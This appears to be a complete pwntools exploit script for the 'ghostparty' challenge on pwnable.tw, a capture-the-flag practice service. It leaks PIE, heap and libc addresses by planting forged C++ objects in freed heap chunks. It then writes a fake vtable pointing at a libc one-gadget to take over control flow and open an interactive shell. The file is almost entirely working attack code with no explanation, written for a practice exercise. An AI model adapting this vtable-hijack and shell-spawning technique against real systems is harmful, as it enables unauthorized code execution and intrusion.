from pwn import *
context(arch = 'amd64', os = 'linux')
elf = ELF('./ghostparty')

class GhostExploit():
    def __init__(self, c):
        #constant
        self.WEREWOLF = 1
        self.MUMMY = 5
        self.VAMPIRE = 7

        self.conn = c
        self.werewolf_vtable = 0

        #leak
        self.PIE = 0
        self.HEAP = 0
        self.LIBC = 0

        #offset
        self.Werewolf_vtable_offset = 0x210B98
        self.vector_M_Start = 0x211030
        self.libc_start_main = 0x210E90
        self.libc_start_main_from_libc = 0x20740

    def selchoice(self, choice):
        self.conn.recvuntil('Your choice :')
        self.conn.sendline(str(choice))
    
    def addghost(self, name, age, msg, ghostType, smalllistChoice, val1):
        self.selchoice(1)
        self.conn.recvuntil('Name : ')
        self.conn.sendline(name)
        self.conn.recvuntil('Age : ')
        self.conn.sendline(str(age))
        self.conn.recvuntil('Message : ')
        self.conn.sendline(msg)
        self.conn.recvuntil('Choose a type of ghost :')
        self.conn.sendline(str(ghostType))
    
        if( ghostType == 1 ): # Werewolf (size=0x60)
            self.conn.recvuntil('Full moon ? (1:yes/0:no):')
            self.conn.sendline(str(val1))
        elif( ghostType == 5 ): # Mummy (size=0x78)
            self.conn.recvuntil('Commit on bandage : ')
            self.conn.sendline(val1)
        elif( ghostType == 7 ): # Vampire (size=0x60)
            self.conn.recvuntil('Add blood :')
            self.conn.sendline(val1)
        else:
            print "Invaild choice"
            exit(1)
    
        self.conn.recvuntil('Your choice : ')
        self.conn.sendline(str(smalllistChoice))
        self.conn.recv()
    
    def showGhostInfo(self, ghostNum):
        self.selchoice(2)
        self.conn.recvuntil('party : ')
        self.conn.sendline(str(ghostNum))
    
    def rmghost(self, ghostNum):
        self.selchoice(4)
        self.conn.recvuntil('party : ')
        self.conn.sendline(str(ghostNum))
    
    def addFakeObjectForLeak(self, nameAddr):
        fakeObj = [
            self.werewolf_vtable,  # vtable
            0x00,                  # int age
            nameAddr,              # char *name 
            0x00,                  # String type(type.pstr) 
            0x00                   #            (type.size)
        ]
        msg = ''.join(p64(_) for _ in fakeObj)
        msg += "A"*(0x5F-len(msg))
        self.addghost('1',1,msg,self.MUMMY,1,'A')
    
    def addFakeObjectForEIP(self, vtableAddr, vtable):
        fakeObj = [
            vtableAddr,       # vtable
            0x00,             # int age
            0x00,             # char *name 
            0x00,             # String type(type.pstr) 
            0x00,             #            (type.size)
        ]
        msg = ''.join(p64(_) for _ in fakeObj+vtable)
        msg += "A"*(0x5F-len(msg))
        self.addghost('1',1,msg,self.MUMMY,1,'A')

    def exploit(self):
        from IPython import embed; embed()
        self.addghost('1',1,'1',self.VAMPIRE,3,'A'*0x5F)
        self.addghost('1',1,'1',self.WEREWOLF,1,0) #Vampire, Werewolf
    
        # Leak PIE
        self.showGhostInfo(0)
        self.conn.recvuntil('Blood : ')
        werewolf_vtable = u64(self.conn.recv(6)+'\x00'*2)
        self.PIE = werewolf_vtable - self.Werewolf_vtable_offset 
        log.info('PIE : 0x%x' % self.PIE)
    
        # Leak HEAP
        self.rmghost(0) #Werewolf
        self.addFakeObjectForLeak(self.PIE+self.vector_M_Start) #Werewolf, Mummy
        self.selchoice(2)
        self.conn.recvuntil(' : ')
        HEAP = u64(self.conn.recv(6) + '\x00'*2)
        log.info('HEAP : 0x%x' % HEAP)
        self.conn.sendline(str(-1))
    
        # Leak LIBC
        self.rmghost(1) #Werewolf
        self.addFakeObjectForLeak(self.PIE+self.libc_start_main) #Werewolf, Mummy
        self.selchoice(2)
        self.conn.recvuntil(' : ')
        LIBC = u64(self.conn.recv(6) + '\x00'*2) - self.libc_start_main_from_libc 
        log.info('LIBC : 0x%x' % LIBC)
        self.conn.sendline(str(-1))
    
        # create fake vtable
        fakeVtable = [0x00, 0x00, LIBC+0x0EF6C4] #speak, changemsg, ghostinfo
    
        # control EIP
        self.rmghost(1) #Werewolf
        self.addFakeObjectForEIP(HEAP+0x128, fakeVtable) #libc_start_main #Werewolf, Mummy
        self.selchoice(2)
        self.conn.recvuntil(' : ')
        self.conn.sendline(str(0))
        self.conn.interactive()
    

if __name__ == "__main__":
    #conn = remote('127.0.0.1', 12121)
    conn = remote('chall.pwnable.tw', 10401)

    ghostexploit = GhostExploit(conn)
    ghostexploit.exploit()
    

